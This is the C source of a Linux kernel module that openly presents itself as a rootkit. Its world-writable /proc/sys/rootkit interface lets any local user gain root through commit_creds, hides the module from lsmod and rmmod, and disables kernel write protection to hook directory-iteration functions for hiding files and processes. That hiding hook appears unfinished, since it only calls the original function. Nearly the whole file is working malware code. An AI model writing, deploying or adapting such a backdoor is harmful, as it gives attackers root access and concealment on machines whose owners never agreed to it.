#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nobody important");
MODULE_DESCRIPTION("Totally innocent kernel module");
MODULE_VERSION("1.0");

#define log(...) printk(KERN_INFO "rootkit: " __VA_ARGS__)

// Hook state, used for trampoline and restoring
// original function
struct fops_hook {
    struct list_head list;
    struct file_operations *fops;
    int (*iterate_orig)(struct file *, struct dir_context *);
    int (*iterate_shared_orig)(struct file *, struct dir_context *);
};

// Keeps track of all the files we've hidden
LIST_HEAD(fops_hook_list);

// Buffer for copying strings into the kernel
static char cmd_buf[128];

// Grants the calling process root permissions.
static int sysctl_escalate(void)
{
    struct cred *cred;
    
    log("Escalating caller creds to root\n");
    cred = prepare_kernel_cred(NULL);
    if (cred == NULL) {
        return -1;
    }
    return commit_creds(cred);
}

// Makes the module invisible. After this, should
// not see it in lsmod, and rmmod should fail to
// remove it. insmod will still fail since the
// kobject is still there and causes a name collision.
//
// Warning: the only way to unload the module after
// this is to reboot the machine!
static int sysctl_hide_self(void)
{
    // Don't double-hide
    if (THIS_MODULE->list.next == NULL ||
        THIS_MODULE->list.prev == NULL) {
        log("Module already hidden\n");
        return 0;
    }

    mutex_lock(&module_mutex);
    list_del_rcu(&THIS_MODULE->list);
    mutex_unlock(&module_mutex);
    THIS_MODULE->list.next = NULL;
    THIS_MODULE->list.prev = NULL;
    log("Module successfully hidden\n");
    return 0;
}

static int iterate_hook(struct file *file, struct dir_context *context)
{
    struct list_head *curr;

    log("fops->iterate() hook\n");

    // Super lame trampoline: find the hook corresponding to this
    // file type, and call the original iterate function.
    list_for_each(curr, &fops_hook_list) {
        struct fops_hook *hook = list_entry(curr, struct fops_hook, list);
        if (hook->fops == file->f_op) {
            if (hook->iterate_shared_orig) {
                return hook->iterate_shared_orig(file, context);
            } else if (hook->iterate_orig) {
                return hook->iterate_orig(file, context);
            } else {
                BUG();
            }
        }
    }

    // Should never reach this point
    BUG();
}

// Enables writing to read-only pages.
static void yolo_begin(void)
{
    preempt_disable();
    barrier();
    write_cr0(read_cr0() & ~X86_CR0_WP);
}

// Disables writing to read-only pages.
static void yolo_end(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
    preempt_enable();
}

// Hides a file. The file may still be opened, but
// attempts to ls the parent directory will not
// display the file. Hiding a file under /proc can
// also be used to hide the presence of a process.
static int sysctl_hide_file(const char *path)
{
    int ret = -1;
    struct file *f;
    struct fops_hook *hook = NULL;
    struct file_operations *fops;

    log("Hiding file: %s\n", path);

#if 0
    char parent_path[PATH_MAX];
    if (strscpy(parent_path, path, sizeof(parent_path)) < 0) {
        log("Path too long: %s\n", path);
        return -1;
    }

    char *last_segment = strrchr(parent_path);
    if (last_segment == NULL) {
        log("Path too short\n");
    }
#endif

    // Open the file so we can get its file ops table
    f = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(f)) {
        log("Path does not exist/cannot be opened\n");
        goto cleanup;
    }

    hook = kmalloc(sizeof(*hook), GFP_KERNEL);
    if (hook == NULL) {
        log("Failed to allocate hook struct\n");
        goto cleanup;
    }

    fops = (struct file_operations *)f->f_op;
    if (fops->iterate_shared == NULL && fops->iterate == NULL) {
        log("Parent path is not iterable\n");
        goto cleanup;
    }

    // Save iterate function (used by getdents, which in turn
    // is used by readdir, which in turn is used by ls) in the
    // file ops table. Need to enable #YOLO mode, since file ops
    // tables are usually declared const.
    hook->fops = fops;
    hook->iterate_shared_orig = fops->iterate_shared;
    hook->iterate_orig = fops->iterate;

    // Replace iterate and iterate_shared with our hacked version.
    // Note that iterate is the same as iterate_shared, but the
    // caller acquires the protecting semaphore in r/w mode instead
    // of r/o mode, so it's always safe to replace iterate with
    // iterate_shared (but not the other way around).
    yolo_begin();
    fops->iterate = iterate_hook;
    fops->iterate_shared = NULL;
    yolo_end();

    // Add hook into list (must come last, unless you want to
    // remove it in cleanup for whatever reason)
    list_add(&hook->list, &fops_hook_list);

    ret = 0;

cleanup:
    if (ret < 0) {
        if (hook != NULL) {
            kfree(hook);
        }
    }

    if (!IS_ERR(f)) {
        filp_close(f, 0);
    }

    return ret;
}

// Used when the user reads from the sysctl file.
// Copies the given src string into the provided
// userspace buffer.
static int sysctl_strcpy_to_user(
    const char *src,
    char __user *buffer,
    size_t *lenp,
    loff_t *ppos)
{
    size_t buf_len, copy_len;
    loff_t start;

    buf_len = strlen(src);
    start = *ppos;
    copy_len = *lenp;

    if (start >= buf_len) {
        *lenp = 0;
        return 0;
    }

    if (copy_len > buf_len - start) {
        copy_len = buf_len - start;
    }

    if (copy_to_user(buffer, &src[start], copy_len)) {
        return -EFAULT;
    }

    *lenp = copy_len;
    *ppos += copy_len;
    return 0;
}

// Used when the user reads from the sysctl file.
// Copies the given src string into the provided
// userspace buffer.
static int sysctl_strcpy_to_kernel(
    char buffer[],
    size_t buf_len,
    char __user *src,
    size_t *lenp,
    loff_t *ppos)
{
    size_t copy_len;
    loff_t start;

    start = *ppos;
    copy_len = *lenp;

    if (copy_len > buf_len) {
        copy_len = buf_len;
    }

    if (copy_from_user(buffer, &src[start], copy_len)) {
        return -EFAULT;
    }

    buffer[buf_len - 1] = '\0';
    buffer[strcspn(buffer, "\r\n")] = '\0';

    return *lenp - copy_len;
}

// Gets called when a read/write to the /proc/sys/rootkit
// file occurs.
//
// To test read: cat /proc/sys/rootkit
// To test write: echo "foo" > /proc/sys/rootkit
static int sysctl_handler(
    struct ctl_table *ctl,
    int write,
    void __user *buffer,
    size_t *lenp,
    loff_t *ppos)
{
    if (!write) {
        return sysctl_strcpy_to_user("not_a_virus.mp3.doc.zip.exe\n", buffer, lenp, ppos);
    } else {
        sysctl_strcpy_to_kernel(cmd_buf, sizeof(cmd_buf), buffer, lenp, ppos);
    }

    if (strcmp(cmd_buf, "i_can_haz_root") == 0) {
        return sysctl_escalate();
    } else if (strcmp(cmd_buf, "im_in_ur_kernel") == 0) {
        return sysctl_hide_self();
    } else if (strncmp(cmd_buf, "cant_touch_this ", strlen("cant_touch_this ")) == 0) {
        return sysctl_hide_file(&cmd_buf[strlen("cant_touch_this ")]);
    } else {
        log("Unknown command: %s\n", cmd_buf);
        return -EINVAL;
    }
}

// Defines our entry in /proc/sys/rootkit
static struct ctl_table_header *ctl_hdr;
static struct ctl_table ctl_table[] = {
    {
        .procname = "rootkit",
        .data = cmd_buf,
        .maxlen = sizeof(cmd_buf),
        .mode = 0666,
        .child = NULL,
        .proc_handler = &sysctl_handler,
        .poll = NULL,
        .extra1 = NULL,
        .extra2 = NULL,
    },
    {}
};

// Called when the rootkit is loaded into the kernel
static int __init rootkit_init(void)
{
    ctl_hdr = register_sysctl_table(ctl_table);
    log("Rootkit installed\n");
    return 0;
}

// Called when the rootkit is unloaded from the kernel
static void __exit rootkit_exit(void)
{
    struct list_head *curr, *n;
    unregister_sysctl_table(ctl_hdr);

    // Order is important: we treat the modifications like
    // a stack. If the same fops was hooked twice, we should
    // first restore the hooked version, then from the hooked
    // version we should restore the original. Since we used
    // list_add(), we should use list_for_each() here.
    list_for_each_safe(curr, n, &fops_hook_list) {
        // Restore original iterate functions
        struct fops_hook *hook = list_entry(curr, struct fops_hook, list);
        yolo_begin();
        hook->fops->iterate = hook->iterate_orig;
        hook->fops->iterate_shared = hook->iterate_shared_orig;
        yolo_end();

        // Delete from list
        list_del(curr);
        kfree(hook);
    }

    log("Rootkit uninstalled\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
